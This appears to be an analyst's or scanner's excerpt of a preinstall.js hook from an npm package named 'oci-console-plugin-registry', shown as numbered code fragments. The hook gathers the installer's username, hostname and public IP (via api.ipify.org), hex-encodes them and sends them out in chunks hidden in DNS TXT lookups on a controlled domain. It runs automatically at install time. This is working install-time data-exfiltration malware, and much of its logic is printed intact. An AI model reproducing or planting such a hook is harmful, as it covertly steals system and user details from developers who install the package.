// File: tmp/tmpzjm8egk_/oci-console-plugin-registry/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const crypto = require('crypto')
Line 4: const https = require('https')
Line 6: crypto.randomBytes(16).toString('hex')
Line 10: (_tmp_1 = https.get('https://api.ipify.org?format=json', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(JSON.parse(data).ip));
    }))
Line 33: {
    const jsonData = JSON.stringify(data);
    const hexData = Buffer.from(jsonData).toString('hex');

    if (!hexData) {
        console.error('Error: No data to send');
        return;
    }


    if (hexData.length > 1000) {
        console.warn('Warning:');
    }

    const chunkSize = 58;
    const chunks = [];
    for (let i = 0; i < hexData.length; i += chunkSize) {
        chunks.push(hexData.slice(i, i + chunkSize));
    }

    for (let i = 0; i < chunks.length; i++) {
        const sd = `${i}-${chunks[i]}.${dn}`;
        if (sd.length > 255) {
            console.error(`sd too long: ${sd}`);
            continue;
        }
        const success = await resolveWithRetry(sd, 'TXT');
        if (!success) {
        }
    }
}
Line 35: Buffer.from(jsonData).toString('hex')
Line 44: console.warn('Warning:')
Line 48: const chunks = []
Line 50: chunks.push(hexData.slice(i, i + chunkSize))
Line 53: {
        const sd = `${i}-${chunks[i]}.${dn}`;
        if (sd.length > 255) {
            console.error(`sd too long: ${sd}`);
            continue;
        }
        const success = await resolveWithRetry(sd, 'TXT');
        if (!success) {
        }
    }
Line 54: const sd = `${i}-${chunks[i]}.${dn}`
Line 59: resolveWithRetry(sd, 'TXT')
Line 70: os.userInfo()
Line 71: os.hostname()
Line 77: sendViaD(installData, dn)
